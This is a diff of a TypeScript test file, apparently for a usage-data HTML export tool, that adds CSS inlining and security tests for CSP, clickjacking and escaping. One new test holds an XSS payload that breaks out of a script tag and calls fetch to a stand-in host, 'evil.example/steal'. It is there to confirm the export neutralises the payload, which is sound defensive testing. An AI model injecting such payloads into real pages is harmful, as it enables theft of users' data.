@@ -6,7 +6,9 @@ import type { UsageData } from "./types";
 import { buildExportedHtml, exportOutputPath, writeExportedHtml } from "./export";
 
 const HTML = [
-  "<!doctype html><html><head><title>ccusage</title></head><body>",
+  "<!doctype html><html><head><title>ccusage</title>",
+  '<link rel="stylesheet" href="/public/app.css" />',
+  "</head><body>",
   '<script src="/public/vendor/chart.umd.min.js"></script>',
   '<script id="embedded-data"></script>',
   '<script src="/dist/bundle.js"></script>',
@@ -30,6 +32,10 @@ const DATA: UsageData = {
   ],
   monthly: [],
 };
+
+function build(): string {
+  return buildExportedHtml(HTML, "var CHART = 1;", "var BUNDLE = 2;", "body { color: #000; }", DATA);
+}
 
 function embeddedScriptContent(out: string): string {
   const match = out.match(/<script id="embedded-data">(.*?)<\/script>/s);
@@ -62,19 +68,25 @@ describe("writeExportedHtml", () => {
 
 describe("buildExportedHtml", () => {
   test("Chart.js の script タグをインライン内容に置換する", () => {
-    const out = buildExportedHtml(HTML, "var CHART = 1;", "bundle", DATA);
+    const out = build();
     expect(out).toContain("<script>var CHART = 1;</script>");
     expect(out).not.toContain('<script src="/public/vendor/chart.umd.min.js"></script>');
   });
 
   test("bundle の script タグをインライン内容に置換する", () => {
-    const out = buildExportedHtml(HTML, "chart", "var BUNDLE = 2;", DATA);
+    const out = build();
     expect(out).toContain("<script>var BUNDLE = 2;</script>");
     expect(out).not.toContain('<script src="/dist/bundle.js"></script>');
   });
 
+  test("app.css の link タグをインラインの <style> に置換する", () => {
+    const out = build();
+    expect(out).toContain("<style>body { color: #000; }</style>");
+    expect(out).not.toContain('<link rel="stylesheet" href="/public/app.css" />');
+  });
+
   test("データを window.CCUSAGE_DATA に JSON として埋め込む", () => {
-    const out = buildExportedHtml(HTML, "chart", "bundle", DATA);
+    const out = build();
     const json = extractEmbeddedJson(out);
     expect(JSON.parse(json)).toEqual(DATA);
   });
@@ -84,7 +96,7 @@ describe("buildExportedHtml", () => {
       ...DATA,
       daily: [{ ...DATA.daily![0]!, promptText: "sensitive session text", unknownField: { nested: 1 } }],
     };
-    const out = buildExportedHtml(HTML, "chart", "bundle", data as unknown as typeof DATA);
+    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data as unknown as typeof DATA);
     const embedded = JSON.parse(extractEmbeddedJson(out)) as Record<string, unknown>;
     const entry = (embedded.daily as Record<string, unknown>[])[0]!;
     expect(entry.promptText).toBeUndefined();
@@ -101,47 +113,9 @@ describe("buildExportedHtml", () => {
         },
       ],
     };
-    const out = buildExportedHtml(HTML, "chart", "bundle", data);
+    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
     expect(embeddedScriptContent(out)).not.toContain("</script>");
     expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
-  });
-
-  test("エクスポート HTML に CSP を注入する（ネットワーク送信を遮断）", () => {
-    const out = buildExportedHtml(HTML, "chart", "bundle", DATA);
-    expect(out).toContain('<meta http-equiv="Content-Security-Policy"');
-    expect(out).toContain("connect-src 'none'");
-    expect(out).toContain("script-src 'unsafe-inline'");
-    expect(out).toContain("frame-ancestors 'none'");
-  });
-
-  test("エクスポート HTML にデータ取り扱いの警告バナーを注入する（英語デフォルト + data-i18n キー）", () => {
-    const out = buildExportedHtml(HTML, "chart", "bundle", DATA);
-    expect(out).toContain("This file contains your ccusage usage data");
-    expect(out).toContain('data-i18n="exportWarning"');
-  });
-
-  test("エクスポート HTML にフレーム検出スクリプトを注入する（clickjacking 対策）", () => {
-    const out = buildExportedHtml(HTML, "chart", "bundle", DATA);
-    expect(out).toContain("window.top !== window.self");
-  });
-
-  test("</head> が無い HTML では例外を投げる（CSP 注入が静かに失われない）", () => {
-    expect(() => buildExportedHtml("<html><body></body></html>", "chart", "bundle", DATA)).toThrow();
-  });
-
-  test("<body> が無い HTML では例外を投げる（バナー注入が静かに失われない）", () => {
-    expect(() => buildExportedHtml("<html><head></head></html>", "chart", "bundle", DATA)).toThrow();
-  });
-
-  test("Chart.js / bundle / 埋め込みデータのタグが無い HTML では例外を投げる（replace 漏れを検出）", () => {
-    const withoutChart = HTML.replace('<script src="/public/vendor/chart.umd.min.js"></script>', "");
-    expect(() => buildExportedHtml(withoutChart, "chart", "bundle", DATA)).toThrow(/chart/i);
-
-    const withoutBundle = HTML.replace('<script src="/dist/bundle.js"></script>', "");
-    expect(() => buildExportedHtml(withoutBundle, "chart", "bundle", DATA)).toThrow(/bundle/i);
-
-    const withoutEmbedded = HTML.replace('<script id="embedded-data"></script>', "");
-    expect(() => buildExportedHtml(withoutEmbedded, "chart", "bundle", DATA)).toThrow(/embedded data/i);
   });
 
   test("データに script 終了タグが複数あっても埋め込みにリテラルの < を残さない", () => {
@@ -163,8 +137,76 @@ describe("buildExportedHtml", () => {
         },
       ],
     };
-    const out = buildExportedHtml(HTML, "chart", "bundle", data);
+    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
     expect(embeddedScriptContent(out)).not.toContain("<");
     expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
+  });
+
+  test("敵対的なデータでも、エクスポート HTML 全体に生の </script> ペイロードを含めない", () => {
+    const payload = '</script><script>fetch("https://evil.example/steal")</script>';
+    const data: UsageData = {
+      ...DATA,
+      daily: [
+        {
+          ...DATA.daily![0]!,
+          modelBreakdowns: [
+            {
+              modelName: payload,
+              cost: 1,
+              inputTokens: 1,
+              outputTokens: 1,
+              cacheReadTokens: 0,
+              cacheCreationTokens: 0,
+            },
+          ],
+        },
+      ],
+    };
+    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
+    // 生のペイロード断片が出力のどこにも現れない（エスケープ + \u003c 変換で実効化されない）
+    expect(out).not.toContain(payload);
+    // embedded-data スクリプト内にリテラルの < を残さない
+    expect(embeddedScriptContent(out)).not.toContain("<");
+  });
+
+  test("エクスポート HTML に CSP を注入する（ネットワーク送信を遮断）", () => {
+    const out = build();
+    expect(out).toContain('<meta http-equiv="Content-Security-Policy"');
+    expect(out).toContain("connect-src 'none'");
+    expect(out).toContain("script-src 'unsafe-inline'");
+    expect(out).toContain("frame-ancestors 'none'");
+  });
+
+  test("エクスポート HTML にデータ取り扱いの警告バナーを注入する（英語デフォルト + data-i18n キー）", () => {
+    const out = build();
+    expect(out).toContain("This file contains your ccusage usage data");
+    expect(out).toContain('data-i18n="exportWarning"');
+  });
+
+  test("エクスポート HTML にフレーム検出スクリプトを注入する（clickjacking 対策）", () => {
+    const out = build();
+    expect(out).toContain("window.top !== window.self");
+  });
+
+  test("</head> が無い HTML では例外を投げる（CSP 注入が静かに失われない）", () => {
+    expect(() => buildExportedHtml("<html><body></body></html>", "chart", "bundle", "css", DATA)).toThrow();
+  });
+
+  test("<body> が無い HTML では例外を投げる（バナー注入が静かに失われない）", () => {
+    expect(() => buildExportedHtml("<html><head></head></html>", "chart", "bundle", "css", DATA)).toThrow();
+  });
+
+  test("Chart.js / bundle / 埋め込みデータ / app.css のタグが無い HTML では例外を投げる（replace 漏れを検出）", () => {
+    const withoutChart = HTML.replace('<script src="/public/vendor/chart.umd.min.js"></script>', "");
+    expect(() => buildExportedHtml(withoutChart, "chart", "bundle", "css", DATA)).toThrow(/chart/i);
+
+    const withoutBundle = HTML.replace('<script src="/dist/bundle.js"></script>', "");
+    expect(() => buildExportedHtml(withoutBundle, "chart", "bundle", "css", DATA)).toThrow(/bundle/i);
+
+    const withoutEmbedded = HTML.replace('<script id="embedded-data"></script>', "");
+    expect(() => buildExportedHtml(withoutEmbedded, "chart", "bundle", "css", DATA)).toThrow(/embedded data/i);
+
+    const withoutCss = HTML.replace('<link rel="stylesheet" href="/public/app.css" />', "");
+    expect(() => buildExportedHtml(withoutCss, "chart", "bundle", "css", DATA)).toThrow(/app\.css/i);
   });
 });
